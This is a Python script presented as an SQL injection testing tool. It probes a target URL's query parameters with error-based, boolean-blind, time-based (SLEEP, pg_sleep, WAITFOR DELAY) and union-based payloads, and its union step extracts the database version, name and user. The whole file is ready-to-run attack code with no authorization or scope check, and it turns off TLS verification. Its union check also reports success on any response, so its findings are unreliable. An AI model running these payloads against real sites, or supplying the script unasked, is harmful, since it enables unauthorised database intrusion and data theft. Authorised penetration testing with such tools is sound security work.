#!/usr/bin/env python3
"""
Advanced SQL Injection Testing Tool
Supports: Error-based, Blind, Time-based, Union-based SQLi
"""

import requests
import time
import urllib3
from urllib.parse import urljoin, urlparse, parse_qs

urllib3.disable_warnings()

class AdvancedSQLiTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.verify = False
        
    def test_error_based_sqli(self, url, params):
        """Test Error-based SQL Injection"""
        print("\n[*] Testing Error-based SQL Injection...")
        
        error_payloads = [
            "'",
            "\"",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
        ]
        
        sql_errors = {
            'MySQL': [
                'SQL syntax.*MySQL',
                'Warning.*mysql_',
                'MySqlException',
                'valid MySQL result',
            ],
            'PostgreSQL': [
                'PostgreSQL.*ERROR',
                'Warning.*pg_',
                'valid PostgreSQL result',
                'Npgsql',
            ],
            'MSSQL': [
                'Driver.*SQL.*Server',
                'OLE DB.*SQL Server',
                'ODBC SQL Server Driver',
                'Microsoft SQL Native Client',
            ],
            'Oracle': [
                'ORA-[0-9][0-9][0-9][0-9]',
                'Oracle error',
                'Oracle.*Driver',
            ]
        }
        
        for param_name in params:
            print(f"\n[*] Testing parameter: {param_name}")
            
            for payload in error_payloads:
                test_params = params.copy()
                test_params[param_name] = payload
                
                try:
                    response = self.session.get(url, params=test_params, timeout=10)
                    
                    # Check for SQL errors
                    for db_type, patterns in sql_errors.items():
                        for pattern in patterns:
                            if pattern in response.text:
                                print(f"[+] VULNERABLE! {db_type} Error-based SQLi")
                                print(f"    Parameter: {param_name}")
                                print(f"    Payload: {payload}")
                                print(f"    Error Pattern: {pattern}")
                                return True
                
                except Exception as e:
                    continue
        
        print("[-] No Error-based SQLi found")
        return False
    
    def test_blind_boolean_sqli(self, url, params):
        """Test Boolean-based Blind SQL Injection"""
        print("\n[*] Testing Boolean-based Blind SQL Injection...")
        
        for param_name in params:
            print(f"\n[*] Testing parameter: {param_name}")
            
            # Get baseline responses
            baseline_params = params.copy()
            try:
                baseline_true = self.session.get(url, params=baseline_params, timeout=10)
            except:
                continue
            
            # Test TRUE condition
            true_params = params.copy()
            true_params[param_name] = f"{params[param_name]}' AND '1'='1"
            
            try:
                response_true = self.session.get(url, params=true_params, timeout=10)
            except:
                continue
            
            # Test FALSE condition
            false_params = params.copy()
            false_params[param_name] = f"{params[param_name]}' AND '1'='2"
            
            try:
                response_false = self.session.get(url, params=false_params, timeout=10)
            except:
                continue
            
            # Compare responses
            if (len(response_true.text) != len(response_false.text) or
                response_true.status_code != response_false.status_code):
                print(f"[+] VULNERABLE! Boolean-based Blind SQLi")
                print(f"    Parameter: {param_name}")
                print(f"    TRUE condition length: {len(response_true.text)}")
                print(f"    FALSE condition length: {len(response_false.text)}")
                return True
        
        print("[-] No Boolean-based Blind SQLi found")
        return False
    
    def test_time_based_blind_sqli(self, url, params):
        """Test Time-based Blind SQL Injection"""
        print("\n[*] Testing Time-based Blind SQL Injection...")
        
        time_payloads = {
            'MySQL': [
                "' AND SLEEP(5)--",
                "' AND BENCHMARK(5000000,MD5('test'))--",
            ],
            'PostgreSQL': [
                "'; SELECT pg_sleep(5)--",
            ],
            'MSSQL': [
                "'; WAITFOR DELAY '0:0:5'--",
            ],
            'Oracle': [
                "' AND DBMS_LOCK.SLEEP(5)--",
            ]
        }
        
        for param_name in params:
            print(f"\n[*] Testing parameter: {param_name}")
            
            for db_type, payloads in time_payloads.items():
                for payload in payloads:
                    test_params = params.copy()
                    test_params[param_name] = payload
                    
                    try:
                        start_time = time.time()
                        response = self.session.get(url, params=test_params, timeout=15)
                        elapsed_time = time.time() - start_time
                        
                        if elapsed_time >= 5:
                            print(f"[+] VULNERABLE! {db_type} Time-based Blind SQLi")
                            print(f"    Parameter: {param_name}")
                            print(f"    Payload: {payload}")
                            print(f"    Response time: {elapsed_time:.2f}s")
                            return True
                    
                    except requests.exceptions.Timeout:
                        print(f"[+] VULNERABLE! {db_type} Time-based Blind SQLi (Timeout)")
                        print(f"    Parameter: {param_name}")
                        print(f"    Payload: {payload}")
                        return True
                    except Exception as e:
                        continue
        
        print("[-] No Time-based Blind SQLi found")
        return False
    
    def test_union_based_sqli(self, url, params):
        """Test Union-based SQL Injection"""
        print("\n[*] Testing Union-based SQL Injection...")
        
        for param_name in params:
            print(f"\n[*] Testing parameter: {param_name}")
            
            # Find number of columns
            max_columns = 10
            columns_found = None
            
            for num_cols in range(1, max_columns + 1):
                null_list = ','.join(['NULL'] * num_cols)
                payload = f"' UNION SELECT {null_list}--"
                
                test_params = params.copy()
                test_params[param_name] = payload
                
                try:
                    response = self.session.get(url, params=test_params, timeout=10)
                    
                    # Check if query executed without errors
                    if response.status_code == 200:
                        # Check for common error messages
                        if not any(err in response.text.lower() for err in 
                                 ['error', 'warning', 'syntax', 'mysql', 'sql']):
                            columns_found = num_cols
                            print(f"[+] Found {num_cols} columns!")
                            break
                
                except Exception as e:
                    continue
            
            if columns_found:
                # Try to extract data
                info_payloads = [
                    f"' UNION SELECT {','.join(['NULL'] * (columns_found - 1))},@@version--",
                    f"' UNION SELECT {','.join(['NULL'] * (columns_found - 1))},database()--",
                    f"' UNION SELECT {','.join(['NULL'] * (columns_found - 1))},user()--",
                ]
                
                for payload in info_payloads:
                    test_params = params.copy()
                    test_params[param_name] = payload
                    
                    try:
                        response = self.session.get(url, params=test_params, timeout=10)
                        print(f"[+] VULNERABLE! Union-based SQLi")
                        print(f"    Parameter: {param_name}")
                        print(f"    Columns: {columns_found}")
                        print(f"    Payload: {payload}")
                        return True
                    except:
                        continue
        
        print("[-] No Union-based SQLi found")
        return False
    
    def run_all_tests(self, url, params):
        """Run all SQL injection tests"""
        print(f"\n{'='*60}")
        print(f"SQL INJECTION TESTING")
        print(f"Target: {url}")
        print(f"Parameters: {list(params.keys())}")
        print(f"{'='*60}")
        
        vulnerabilities = []
        
        if self.test_error_based_sqli(url, params):
            vulnerabilities.append("Error-based SQLi")
        
        if self.test_blind_boolean_sqli(url, params):
            vulnerabilities.append("Boolean-based Blind SQLi")
        
        if self.test_time_based_blind_sqli(url, params):
            vulnerabilities.append("Time-based Blind SQLi")
        
        if self.test_union_based_sqli(url, params):
            vulnerabilities.append("Union-based SQLi")
        
        print(f"\n{'='*60}")
        if vulnerabilities:
            print(f"[+] VULNERABILITIES FOUND: {', '.join(vulnerabilities)}")
        else:
            print("[-] No SQL Injection vulnerabilities found")
        print(f"{'='*60}")


if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python3 advanced_sqli_test.py <url>")
        print("Example: python3 advanced_sqli_test.py 'http://localhost/page.php?id=1'")
        sys.exit(1)
    
    url = sys.argv[1]
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    # Convert lists to single values
    params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
    
    if not params:
        print("[!] No parameters found in URL")
        print("    URL should contain parameters like: ?id=1&name=test")
        sys.exit(1)
    
    tester = AdvancedSQLiTester(url)
    tester.run_all_tests(url, params)
